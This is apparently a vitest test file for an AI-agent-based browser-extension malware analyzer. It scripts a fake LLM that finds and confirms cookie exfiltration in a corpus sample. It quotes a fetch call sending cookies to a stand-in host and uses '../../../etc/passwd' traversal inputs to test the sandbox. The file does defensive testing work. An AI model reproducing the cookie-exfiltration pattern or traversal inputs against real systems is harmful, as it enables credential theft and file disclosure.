import { mkdtempSync, rmSync, symlinkSync, writeFileSync } from "node:fs";
import { tmpdir } from "node:os";
import { join } from "node:path";
import { describe, it, expect } from "vitest";
import { analyzeCorpus } from "../scripts/analyze-corpus.ts";
import { safeSourcePath } from "../src/methodologies/findings.ts";
import { FakeLlmClient } from "../src/llm/fake.ts";
import { createAgentic, type AgenticTrace } from "../src/methodologies/agentic/index.ts";
import { AgenticTools } from "../src/methodologies/agentic/tools.ts";
import {
  allDimensionsClosed,
  runAgentLoop,
  stopReason,
  type DimensionOutcome,
} from "../src/methodologies/agentic/loop.ts";
import type { EvidencePack } from "../src/pipeline/schema.ts";

const results = analyzeCorpus("corpus", { analyzedAt: "2026-01-01T00:00:00Z" });
const packs = new Map(results.map((r) => [r.sample, r.pack]));
const pack = (s: string): EvidencePack => packs.get(s)!;
const SAMPLE = "mutant-a-exfil-fetch";
const SAMPLE_DIR = `corpus/${SAMPLE}/extension`;

// ---- a scripted agent that drives the loop over mutant-a ----

const f = (obj: unknown): string => JSON.stringify(obj);

// The behavioral claim the agent records after reading background.js:197. Its
// inferred-behavior nature triggers verifyClaim, which (canned) confirms it.
const EXFIL_FINDING = {
  thought: "background.js reads all cookies and POSTs them to an external host",
  tool: "record_finding",
  args: {
    dimension: "exfiltration",
    finding: {
      title: "Cookie exfiltration to external host",
      claim_type: "inferred-behavior",
      severity: "high",
      category: "data-exfiltration",
      confidence: "high",
      claimed_mechanism: "Reads all cookies via chrome.cookies.getAll and POSTs them to collect.evil-analytics-cdn.invalid via fetch.",
      detail: "js/background.js calls chrome.cookies.getAll and fetches them to the external host.",
      evidence_refs: [{ file: "js/background.js", location: { line: 197 }, symbol: null, sink_or_string: "fetch" }],
    },
  },
};

// A pack-only observed-capability for the permissions dimension.
const PERM_FINDING = {
  thought: "the cookies permission is broad for a cookie editor",
  tool: "record_finding",
  args: {
    dimension: "permission-justification",
    finding: {
      title: "Broad cookies permission",
      claim_type: "observed-capability",
      severity: "medium",
      category: "permissions",
      confidence: "medium",
      claimed_mechanism: "",
      detail: "The extension requests the cookies permission.",
      evidence_refs: [{ file: "manifest.json", location: null, symbol: null, sink_or_string: "cookies" }],
    },
  },
};

const dismiss = (dimension: string, ...checks: string[]) =>
  f({ thought: `no concern for ${dimension}`, tool: "record_dismissal", args: { dimension, concern: dimension, checks_run: checks, note: "checked, not present" } });

// Per-dimension scripts: each dimension runs its own loop, so the fake is keyed
// by the `agentic:step:<dimension>` label and replays that dimension's actions.
const GREP = f({ thought: "look for network sinks", tool: "grep", args: { pattern: "fetch\\(|cookies\\.getAll" } });
const READ = f({ thought: "read the flagged region", tool: "read_file", args: { path: "js/background.js", range: { start_line: 190, end_line: 201 } } });
const DIMENSION_SCRIPTS: Record<string, string[]> = {
  exfiltration: [GREP, READ, f(EXFIL_FINDING)],
  "permission-justification": [f(PERM_FINDING)],
  "code-execution": [dismiss("code-execution", "grep for eval/Function", "grep for remote script loads")],
  "stated-purpose-deviation": [dismiss("stated-purpose-deviation", "compared manifest description to observed behavior")],
  obfuscation: [dismiss("obfuscation", "checked for packed/minified first-party files")],
};

const CONFIRMED_JSON = f({
  verdict: "confirmed",
  grounding_line: { file: "js/background.js", line: 197 },
  rationale: "the fetch call sends cookie data to the external host",
  evidence_quote: 'fetch("https://collect.evil-analytics-cdn.invalid/c", …)',
});
const SYNTHESIS_JSON = f({
  layperson_summary: "Manages cookies but also sends them to an outside server.",
  technical_summary: "Verified cookie exfiltration via fetch (finding 1).",
  description_deviation: { deviates: true, note: "A cookie tool should not transmit cookie data externally." },
});

/** Drives the per-dimension loops: scripted action keyed by the dimension in the
 *  `agentic:step:<dimension>` label, plus canned verifier + synthesis. */
function scriptedClient(): FakeLlmClient {
  const counters: Record<string, number> = {};
  return new FakeLlmClient((req) => {
    if (req.label.startsWith("agentic:step:")) {
      const dim = req.label.slice("agentic:step:".length);
      const i = counters[dim] ?? 0;
      counters[dim] = i + 1;
      const reply = DIMENSION_SCRIPTS[dim]?.[i] ?? dismiss(dim, "fallback check");
      return { text: reply, usage: { inputTokens: 10, outputTokens: 5 } };
    }
    if (req.label === "verify:claim") return { text: CONFIRMED_JSON, usage: { inputTokens: 7, outputTokens: 3 } };
    if (req.label === "synthesize") return { text: SYNTHESIS_JSON, usage: { inputTokens: 4, outputTokens: 2 } };
    throw new Error(`unexpected label "${req.label}"`);
  });
}

describe("agentic methodology (end to end over the shared backend)", () => {
  it("discovers and confirms the cookie→external flow as a verified behavior and decides high-risk deterministically", async () => {
    const fake = scriptedClient();
    const out = await createAgentic("test-model").run({ sampleDir: SAMPLE_DIR, pack: pack(SAMPLE) }, fake);

    // The deterministic verdict engine — NOT the agent — owns the tier.
    expect(out.tier).toBe("high-risk");
    expect(out.report).toContain("— verified behavior");
    expect(out.report).toContain("collect.evil-analytics-cdn.invalid");
    expect(out.report).toContain("**confirmed** at `js/background.js:197`");

    // The pack-only finding contributes an observed capability.
    expect(out.report).toContain("— observed capability");

    // The report names its own arm, not the shared collector's "dag".
    expect(out.report).toContain("methodology `agentic`");

    // The verifier ran against real source on the recorded inferred-behavior.
    const labels = fake.calls.map((c) => c.label);
    expect(labels).toContain("agentic:step:exfiltration");
    expect(labels).toContain("verify:claim");
    expect(labels).toContain("synthesize");
  });

  it("captures the full tool-call trace and resolves every dimension", async () => {
    const progress: Array<{ stage: string; phase: string; message: string }> = [];
    const out = await createAgentic("test-model").run({ sampleDir: SAMPLE_DIR, pack: pack(SAMPLE), onProgress: async (stage, phase, message) => { progress.push({ stage, phase, message }); } }, scriptedClient());
    const trace = out.structured as AgenticTrace;
    for (const dimension of Object.keys(DIMENSION_SCRIPTS)) {
      const events = progress.filter((event) => event.stage === `agentic:${dimension}`);
      expect(events.map((event) => event.phase)).toEqual(["started", "finished"]);
      expect(events[1]?.message).toContain("tool calls");
    }

    // The trace is the audit answer to "why did the agent look at X".
    const toolsUsed = trace.toolCalls.map((t) => t.tool);
    expect(toolsUsed).toContain("grep");
    expect(toolsUsed).toContain("read_file");
    expect(toolsUsed).toContain("record_finding");
    expect(toolsUsed.filter((t) => t === "record_dismissal").length).toBeGreaterThanOrEqual(3);

    // Every dimension closed (no budget exhaustion), and a confirmed verdict exists.
    expect(trace.budgetExhausted).toBe(false);
    expect(allDimensionsClosed(trace.dimensions)).toBe(true);
    expect(trace.verdicts.some((v) => v.verdict === "confirmed")).toBe(true);
    expect(trace.dimensions.find((d) => d.dimension === "exfiltration")?.status).toBe("finding");
  });
});

// ---- stop condition (pure) ----

const dims = (statuses: DimensionOutcome["status"][]): DimensionOutcome[] =>
  statuses.map((status, i) => ({ dimension: (["exfiltration", "code-execution", "stated-purpose-deviation", "permission-justification", "obfuscation"] as const)[i]!, status }));

describe("agentic loop stop condition", () => {
  it("continues while a dimension is open and budget remains", () => {
    expect(stopReason(dims(["finding", "open", "open", "open", "open"]), 3, 24)).toBeNull();
  });

  it("stops with all-closed when every dimension is resolved", () => {
    expect(stopReason(dims(["finding", "dismissed", "dismissed", "finding", "dismissed"]), 10, 24)).toBe("all-closed");
    expect(allDimensionsClosed(dims(["finding", "dismissed", "dismissed", "finding", "dismissed"]))).toBe(true);
  });

  it("stops with budget-exhausted only when work remains", () => {
    expect(stopReason(dims(["finding", "open", "open", "open", "open"]), 24, 24)).toBe("budget-exhausted");
    // All-closed takes precedence even at the budget edge.
    expect(stopReason(dims(["finding", "dismissed", "dismissed", "finding", "dismissed"]), 24, 24)).toBe("all-closed");
  });

  it("turns budget-exhausted open dimensions into honest inconclusive dismissals — never silent", async () => {
    const minimalPack = {
      files: [{ path: "js/background.js" }],
      cross_file: { data_flows: [] },
      extension: { manifest: {} },
      manifest_analysis: { externally_connectable: null },
    } as unknown as EvidencePack;
    // A fake that only ever reads — it never closes any dimension, forcing every
    // per-dimension loop to exhaust its budget.
    const client = new FakeLlmClient((req) => {
      if (req.label.startsWith("agentic:step:")) return { text: f({ thought: "keep reading", tool: "read_file", args: { path: "js/background.js", range: { start_line: 1, end_line: 2 } } }), usage: { inputTokens: 1, outputTokens: 1 } };
      throw new Error(`unexpected label "${req.label}"`);
    });
    const state = await runAgentLoop({
      pack: minimalPack,
      sampleDir: SAMPLE_DIR,
      listing: null,
      orientation: "{}",
      client,
      model: "m",
      verifierModel: "m",
      maxStepsPerDimension: 2,
    });
    expect(state.budgetExhausted).toBe(true);
    expect(state.steps).toBe(10); // 5 dimensions × 2 steps each
    expect(state.dimensions.every((d) => d.status === "inconclusive")).toBe(true);
    // Each open dimension produced an explicit dismissal recording the checks run.
    expect(state.dismissals.length).toBe(5);
    expect(state.dismissals.every((d) => d.checks_run.length > 0 && /inconclusive/.test(d.note))).toBe(true);
  });
});

// ---- tool sandbox (path-escape rejection) ----

describe("agentic tool sandbox", () => {
  const tools = () => new AgenticTools({ files: [{ path: "js/background.js" }] } as unknown as EvidencePack, SAMPLE_DIR);

  it("rejects path traversal and absolute paths without reading them", () => {
    expect(tools().readFile("../../../etc/passwd").ok).toBe(false);
    expect(tools().readFile("/etc/passwd").ok).toBe(false);
    expect(tools().readFile("js/../../../package.json").ok).toBe(false);
    expect(tools().grep("x", "../../../etc/passwd").ok).toBe(false);
  });

  it("reads a real in-sandbox file and grounds matches at real line numbers", () => {
    const read = tools().readFile("js/background.js", { start_line: 195, end_line: 200 });
    expect(read.ok).toBe(true);
    expect(read.content).toContain("fetch(");
    expect(read.content).toContain("197:");

    const grep = tools().grep("collect\\.evil-analytics-cdn\\.invalid", "js/background.js");
    expect(grep.ok).toBe(true);
    expect(grep.content).toContain("js/background.js:");
  });

  it("returns an error result for an invalid regex rather than throwing", () => {
    expect(tools().grep("[unterminated").ok).toBe(false);
  });
});

describe("safeSourcePath symlink guard", () => {
  it("rejects a symlink that lives inside the dir but points outside it", () => {
    const root = mkdtempSync(join(tmpdir(), "sandbox-"));
    const outside = mkdtempSync(join(tmpdir(), "outside-"));
    try {
      writeFileSync(join(root, "real.txt"), "in-sandbox");
      writeFileSync(join(outside, "secret.txt"), "out-of-sandbox");
      // A symlink entry that resolves OUT of the sandbox (the unpacked-CRX vector).
      symlinkSync(join(outside, "secret.txt"), join(root, "escape.txt"));
      // …and one to a sibling outside the root entirely.
      symlinkSync(outside, join(root, "outdir"));

      expect(safeSourcePath(root, "real.txt")).not.toBeNull(); // genuine in-sandbox file still works
      expect(safeSourcePath(root, "escape.txt")).toBeNull(); // symlink to an outside file → rejected
      expect(safeSourcePath(root, "outdir/secret.txt")).toBeNull(); // via a symlinked dir → rejected
    } finally {
      rmSync(root, { recursive: true, force: true });
      rmSync(outside, { recursive: true, force: true });
    }
  });
});
